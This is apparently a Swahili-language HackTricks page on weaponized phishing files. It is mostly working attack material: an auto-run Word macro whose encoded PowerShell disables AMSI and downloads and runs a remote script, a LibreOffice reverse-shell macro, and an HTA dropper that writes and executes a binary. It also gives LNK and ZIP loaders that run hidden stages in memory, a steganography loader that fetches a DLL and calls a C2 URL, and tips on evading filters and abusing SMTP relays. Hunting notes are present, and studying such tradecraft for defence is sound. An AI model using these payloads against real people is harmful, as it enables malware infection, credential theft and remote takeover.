# Faili na Nyaraka za Phishing

{{#include ../../banners/hacktricks-training.md}}

## Nyaraka za Office

Microsoft Word hufanya uthibitishaji wa data ya faili kabla ya kufungua faili. Uthibitishaji wa data hufanywa kwa mfumo wa utambuzi wa muundo wa data, kwa kuzingatia kiwango cha OfficeOpenXML. Ikiwa hitilafu yoyote itatokea wakati wa utambuzi wa muundo wa data, faili inayochanganuliwa haitafunguliwa.

Kwa kawaida, faili za Word zilizo na macros hutumia kiendelezi cha `.docm`. Hata hivyo, inawezekana kubadilisha jina la faili kwa kubadilisha kiendelezi cha faili na bado kuhifadhi uwezo wake wa kutekeleza macros.\
Kwa mfano, faili ya RTF haiauni macros, kwa muundo wake, lakini faili ya DOCM iliyobadilishwa jina kuwa RTF itashughulikiwa na Microsoft Word na itaweza kutekeleza macros.\
Mifumo na taratibu zilezile za ndani hutumika kwa software zote za Microsoft Office Suite (Excel, PowerPoint n.k.).

Unaweza kutumia command ifuatayo kuangalia ni viendelezi vipi vitakavyotekelezwa na baadhi ya programu za Office:
```bash
assoc | findstr /i "word excel powerp"
```
Faili za DOCX zinazorejelea template ya mbali (File –Options –Add-ins –Manage: Templates –Go) ambayo inajumuisha macros zinaweza pia “kuendesha” macros.

### External Image Load

Nenda kwenye: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, na **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Nenda kwenye: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Inawezekana kutumia macros kuendesha code yoyote kutoka kwenye document.

#### Autoload functions

Kadiri zinavyotumiwa kwa kawaida, ndivyo uwezekano wa AV kuzitambua unavyoongezeka.

- AutoOpen()
- Document_Open()

#### Mifano ya Code ya Macros
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ondoa metadata manually

Nenda kwenye **File > Info > Inspect Document > Inspect Document**, ambayo itafungua Document Inspector. Bofya **Inspect**, kisha **Remove All** iliyo karibu na **Document Properties and Personal Information**.

#### Kiendelezi cha Doc

Ukimaliza, chagua menyu kunjuzi ya **Save as type**, kisha badilisha format kutoka **`.docx`** hadi **Word 97-2003 `.doc`**.\
Fanya hivi kwa sababu **huwezi kuhifadhi macros ndani ya `.docx`**, na kuna **unyanyapaa** **kuhusu** kiendelezi cha macro-enabled **`.docm`** (kwa mfano, ikoni ya thumbnail ina `!` kubwa, na baadhi ya web/email gateway huzizuia kabisa). Kwa hiyo, **kiendelezi hiki cha zamani `.doc` ndicho suluhisho bora la kati**.

#### Generators za Malicious Macros

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macros za LibreOffice ODT zinazojiendesha kiotomatiki (Basic)

LibreOffice Writer documents zinaweza ku-embed Basic macros na kuzi-execute automatically file inapofunguliwa kwa ku-bind macro kwenye event ya **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Macro rahisi ya reverse shell inaonekana kama:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Kumbuka alama za nukuu zilizorudiwa (`""`) ndani ya string – LibreOffice Basic huzitumia kukwepa alama za nukuu halisi, kwa hivyo payloads zinazoishia na `...==""")` hudumisha usawazisho wa command ya ndani na argument ya Shell.

Vidokezo vya delivery:

- Hifadhi kama `.odt` na uunganishe macro na tukio la document ili ianze mara moja inapofunguliwa.
- Unapotuma barua pepe kwa kutumia `swaks`, tumia `--attach @resume.odt` (alama ya `@` inahitajika ili bytes za file, si string ya jina la file, zitumwe kama attachment). Hili ni muhimu wakati wa kutumia vibaya SMTP servers zinazokubali recipients za kiholela za `RCPT TO` bila validation.

## Faili za HTA

HTA ni program ya Windows inayochanganya **HTML na scripting languages (kama VBScript na JScript)**. Hutengeneza user interface na hutekelezwa kama application "iliyoaminiwa kikamilifu", bila vikwazo vya security model ya browser.

HTA hutekelezwa kwa kutumia **`mshta.exe`**, ambayo kwa kawaida **imesakinishwa** pamoja na **Internet Explorer**, hivyo **`mshta` inategemea IE**. Kwa hiyo, ikiwa imeondolewa, HTAs hazitaweza kutekelezwa.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Kulazimisha NTLM Authentication

Kuna njia kadhaa za **kulazimisha NTLM authentication "remotely"**, kwa mfano, unaweza kuongeza **picha zisizoonekana** kwenye emails au HTML ambayo mtumiaji ataifikia (hata HTTP MitM?). Au kumtumia mwathiriwa **anwani ya files** ambayo **itasababisha** **authentication** anapofungua tu **folder.**

**Angalia mawazo haya na mengine katika kurasa zifuatazo:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Usisahau kwamba huwezi tu kuiba hash au authentication, bali pia **kufanya NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Campaigns zenye ufanisi mkubwa hutuma ZIP iliyo na documents mbili halali za decoy (PDF/DOCX) na .lnk hasidi. Ujanja ni kwamba PowerShell loader halisi huhifadhiwa ndani ya raw bytes za ZIP baada ya marker ya kipekee, na .lnk huichambua na kuiendesha kikamilifu kwenye memory.<sup>[[2]](#references)</sup>

Mtiririko wa kawaida unaotekelezwa na PowerShell one-liner ya .lnk:

1) Tafuta ZIP ya awali katika paths za kawaida: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, na parent ya current working directory.
2) Soma bytes za ZIP na utafute marker iliyowekwa kwenye code (kwa mfano, xFIQCV). Kila kitu baada ya marker hiyo ni embedded PowerShell payload.
3) Copy ZIP kwenda %ProgramData%, extract humo, na ufungue decoy .docx ili ionekane halali.
4) Bypass AMSI kwa current process: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuscate next stage (kwa mfano, ondoa characters zote za #) na ui-execute kwenye memory.

Mfano wa PowerShell skeleton wa kuchambua na kuendesha embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Vidokezo
- Delivery mara nyingi hutumia vibaya PaaS subdomains zinazoaminika (k.m., *.herokuapp.com) na inaweza kuweka payloads nyuma ya masharti (kutumikia ZIPs zisizo na madhara kulingana na IP/UA).
- Hatua inayofuata mara nyingi hufungua kwa decryption shellcode iliyosimbwa kwa base64/XOR na kui-execute kupitia Reflection.Emit + VirtualAlloc ili kupunguza mabaki kwenye disk.

Persistence iliyotumika katika chain hiyo hiyo
- COM TypeLib hijacking ya Microsoft Web Browser control ili IE/Explorer au app yoyote inayoi-embed ianze tena payload automatically.<sup>[[2]](#references)[[4]](#references)</sup> Tazama maelezo na commands zilizo tayari kutumiwa hapa:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files zilizo na ASCII marker string (k.m., xFIQCV) iliyoongezwa mwishoni mwa archive data.
- .lnk inayoorodhesha parent/user folders ili kupata ZIP na kufungua decoy document.
- AMSI tampering kupitia [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Business threads zinazoendelea kwa muda mrefu na kumalizika kwa links zinazohostiwa chini ya trusted PaaS domains.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Pattern nyingine inayojirudia ni **document-impersonating `.lnk`** ambayo hufungua mara moja benign lure huku iki-stage chain halisi kwa nyuma.<sup>[[3]](#references)</sup>

Observed workflow:
1. Shortcut **inajifanya kuwa PDF** na hutumia `conhost.exe` au proxy inayofanana ku-spawn obfuscated PowerShell downloader.
2. PowerShell hugawanya fragments za tokens zilizo wazi (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) ili naive detections zinazotafuta `iwr`, `gci`, `ren`, `cpi`, au `schtasks` zikose command.
3. Stager hupakua **decoy document kwanza**, huifungua kwa victim, kisha huunda upya malicious files kwa nyuma.
4. Payloads zinaweza kuandikwa kwa **junk extensions** na kisha kubadilishwa majina kwa kuondoa filler characters, hivyo kuchelewesha kuonekana kwa artifacts za wazi za `.exe` / `.cpl`.
5. Persistence huwekwa kwa **minute-based scheduled task** ambayo huzindua trusted host binary kutoka user-writable path.

Minimal hunting clues kutoka kwa pattern hii:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Mpangilio muhimu wa staging wa kutambua ni:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` au `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Kwa nini second stage ni stealthy

Katika case study ya Rapid7, scheduled task ilizindua **`Fondue.exe`** mara kwa mara kutoka `C:\Users\Public\`. Kwa sababu **`APPWIZ.cpl`** ilikuwa imewekwa kando yake na ika-export **`RunFODW`**, binary ya Microsoft inayoaminika ili-side-load attacker CPL badala ya system copy halali.

CPL hiyo:
- Husoma blob ya **AES-256-CBC** kutoka `C:\Windows\Tasks\editor.dat`
- Hu-decrypt kupitia **Windows CNG / `bcrypt.dll`**
- Hutenga executable memory na kunakili shellcode iliyodecryptiwa
- Hu-execute shellcode hiyo indirectly kwa kupitisha pointer ya shellcode kama callback ya **`EnumUILanguagesW`**

Hatua hiyo ya mwisho inafaa ku-hunt kivyake: malware mara nyingi huepuka jump ya moja kwa moja kama `((void(*)())buf)()` na badala yake hutumia vibaya **legitimate callback-taking WinAPI** kuhamisha execution.

Payload iliyodecryptiwa katika campaign hii ilikuwa **Donut** shellcode, ambayo baadaye ili-map final PE kikamilifu kwenye memory na ku-patch **AMSI/WLDP/ETW** katika current process kabla ya kukabidhi execution. Kwa maelezo ya kina zaidi kuhusu side-loading na memory-resident post-processing, tazama:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Practical hunting pivots:
- `.lnk` inayozindua `powershell.exe` au `conhost.exe`, ikifuatiwa na decoy document inayoonekana.
- Downloads za muda mfupi kwenda **`C:\Users\Public\`**, zikifuatiwa mara moja na renames kutoka extensions zisizo na maana.
- Scheduled tasks zenye majina yasiyoleta mashaka kama `GoogleErrorReport`, zinazotekelezwa kutoka **user-writable directories**.
- Binaries zinazoaminika zinazopakia faili za **`.cpl` / `.dll`** kutoka directory ileile isiyo ya mfumo.
- Base64 text blobs zinazoandikwa chini ya **`C:\Windows\Tasks\`** na kisha kusomwa na side-loaded module.

## Payloads zilizotenganishwa kwa steganography kwenye images (PowerShell stager)

Recent loader chains huwasilisha JavaScript/VBS iliyofichwa ambayo hu-decode na ku-run Base64 PowerShell stager. Stager hiyo hudownload image (mara nyingi GIF) iliyo na .NET DLL iliyosimbwa kwa Base64 na kufichwa kama plain text kati ya start/end markers za kipekee. Script hutafuta delimiters hizi (mifano iliyoonekana in the wild: «<<sudo_png>> … <<sudo_odt>>>»), hutoa text iliyo kati yao, hui-decode Base64 kuwa bytes, hupakia assembly hiyo in-memory na kuita entry method inayojulikana pamoja na C2 URL.<sup>[[5]](#references)</sup>

Mtiririko wa kazi
- Stage 1: Archived JS/VBS dropper → hu-decode embedded Base64 → huzindua PowerShell stager yenye -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → hudownload image, huchopoa Base64 iliyotenganishwa na markers, hupakia .NET DLL in-memory na kuita method yake (kwa mfano, VAI) ikipitisha C2 URL na options.
- Stage 3: Loader hupata final payload na kwa kawaida hui-inject kupitia process hollowing ndani ya binary inayoaminika (mara nyingi MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Soma zaidi kuhusu process hollowing na trusted utility proxy execution hapa:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Mfano wa PowerShell wa kuchopoa DLL kutoka kwenye image na kuita .NET method in-memory:

<details>
<summary>PowerShell stego payload extractor na loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Maelezo
- Hii ni ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Markers hutofautiana kati ya campaigns.
- AMSI/ETW bypass na string deobfuscation hutumiwa kwa kawaida kabla ya kupakia assembly.
- Hunting: scan images zilizopakuliwa kwa delimiters zinazojulikana; tambua PowerShell inayofikia images na mara moja ku-decode Base64 blobs.

Tazama pia zana za stego na mbinu za carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Hatua ya mwanzo inayojirudia ni `.js` au `.vbs` ndogo yenye obfuscation kubwa, inayowasilishwa ndani ya archive. Kusudi lake pekee ni ku-decode string ya Base64 iliyopachikwa na kuanzisha PowerShell yenye `-nop -w hidden -ep bypass` ili kuanzisha hatua inayofuata kupitia HTTPS.<sup>[[5]](#references)</sup>

Skeleton logic (abstract):
- Soma yaliyomo kwenye file yenyewe
- Tafuta Base64 blob kati ya junk strings
- Decode kuwa ASCII PowerShell
- Execute kwa `wscript.exe`/`cscript.exe` ikimuita `powershell.exe`

Hunting cues
- Attachments za JS/VBS zilizowekwa kwenye archive zinazoanzisha `powershell.exe` yenye `-enc`/`FromBase64String` kwenye command line.
- `wscript.exe` inayoanzisha `powershell.exe -nop -w hidden` kutoka user temp paths.

## Windows files to steal NTLM hashes

Angalia ukurasa kuhusu **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
